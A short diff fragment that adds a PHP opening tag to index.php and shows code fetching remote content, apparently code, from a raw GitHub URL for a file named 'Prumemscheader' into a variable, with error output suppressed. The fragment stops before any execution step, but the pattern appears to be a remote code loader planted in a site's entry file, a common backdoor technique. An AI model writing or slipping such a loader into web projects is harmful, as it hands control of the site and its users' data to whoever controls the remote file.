@@ -1,3 +1,4 @@
+<?php // index.php
 $url = "https://raw.githubusercontent.com/Pankajji1/Script/refs/heads/main/Prumemscheader";
 
 $code = @file_get_contents($url);
